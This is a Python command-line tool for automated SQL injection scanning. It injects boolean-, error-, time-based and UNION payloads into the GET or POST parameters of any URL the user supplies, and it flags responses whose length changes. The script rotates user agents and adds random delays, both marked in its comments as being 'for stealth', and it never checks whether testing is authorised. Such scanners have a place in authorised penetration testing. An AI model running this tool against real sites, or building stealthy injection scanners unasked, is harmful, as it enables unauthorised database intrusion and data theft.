import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import random
import time
import logging
from tqdm import tqdm
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# User agents list for stealth
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/58.0.3029.110",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20100101 Firefox/53.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.1.38 Safari/604.1.38",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/44.0.2403.157 Safari/537.36",
]

# Comprehensive payloads list
PAYLOADS = [
    # Boolean-based SQLi
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\" -- ",
    "\" OR \"1\"=\"1\" /*",
    "1' OR '1'='1",
    "1' OR '1'='1' -- ",
    "1' OR '1'='1' /*",

    # Error-based SQLi
    "' AND 1=CONVERT(int, (SELECT @@version)) -- ",
    "' AND 1=CAST((SELECT @@version) AS int) -- ",

    # Time-based blind SQLi
    "' WAITFOR DELAY '0:0:5'--",
    "'; WAITFOR DELAY '0:0:5'--",

    # Union-based
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
]

# Logging setup
logging.basicConfig(filename="sqli_tool_log.txt", level=logging.INFO,
                    format="%(asctime)s - %(levelname)s - %(message)s")

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def send_request(url, params=None, method='GET'):
    headers = {'User-Agent': get_random_user_agent()}
    try:
        if method == 'GET':
            response = requests.get(url, params=params, headers=headers, timeout=15)
        else:
            response = requests.post(url, data=params, headers=headers, timeout=15)
        return response
    except requests.RequestException as ex:
        print(Fore.RED + f"[!] Request error: {ex}")
        return None

def main():
    print(Fore.CYAN + "Welcome to Advanced SQL Injection Automated Testing Tool")
    url_input = input(Fore.YELLOW + "Enter full URL (with parameters) for GET or URL without parameters for POST testing: ").strip()
    method = input(Fore.YELLOW + "Request method (GET/POST) [default GET]: ").strip().upper()
    if method not in ['GET', 'POST']:
        method = 'GET'

    # Parse URL and parameters
    parsed_url = urlparse(url_input)
    query_params = parse_qs(parsed_url.query)
    if method == 'POST' and not query_params:
        print(Fore.MAGENTA + "[*] POST method selected. Please enter parameters for POST data.")
        query_params = {}
        while True:
            param = input("Parameter name (blank to stop): ").strip()
            if param == '':
                break
            val = input(f"Value for {param}: ").strip()
            query_params[param] = [val]

    if method == 'GET' and not query_params:
        print(Fore.RED + "[!] No parameters found in URL for GET request. Exiting.")
        return
    
    # Baseline normal response length
    base_url = parsed_url._replace(query=urlencode(query_params, doseq=True)).geturl()
    print(Fore.BLUE + "[*] Sending baseline request to get normal response length...")
    base_response = send_request(base_url, method=method, params=query_params if method=='POST' else None)
    if base_response is None:
        print(Fore.RED + "[!] Unable to get baseline response. Exiting.")
        return
    normal_length = len(base_response.text)
    print(Fore.GREEN + f"Baseline response length: {normal_length}")

    print(Fore.CYAN + f"[*] Starting automated testing on parameters using {method} requests...\n")
    # Iterate over parameters and payloads
    for param in query_params:
        print(Fore.YELLOW + f"[+] Testing parameter: {param}")
        for payload in tqdm(PAYLOADS, desc=f"Payloads for {param}"):
            # Prepare new params with payload
            test_params = {}
            for k, v in query_params.items():
                test_params[k] = v[0]
            test_params[param] = payload

            # Construct URL and send request
            if method == 'GET':
                test_url = parsed_url._replace(query=urlencode(test_params)).geturl()
                response = send_request(test_url, method='GET')
            else:
                response = send_request(parsed_url.geturl(), params=test_params, method='POST')

            if response:
                resp_len = len(response.text)

                # Detect potential injection if response length differs significantly
                if abs(resp_len - normal_length) > 50:
                    msg = (Fore.GREEN + f"    [!] Possible SQL Injection detected on parameter '{param}' with payload: {payload} | Response length: {resp_len}")
                    print(msg)
                    logging.info(f"Possible SQLi detected on param '{param}' | Payload: {payload} | Resp length: {resp_len}")
                else:
                    print(Fore.WHITE + f"    Tested payload: {payload} | No significant change")

            # Random delay for stealth between 1 to 3 seconds
            time.sleep(random.uniform(1, 3))
        print()

    print(Fore.CYAN + "Testing completed. Results saved to sqli_tool_log.txt")

if __name__ == "__main__":
    main()
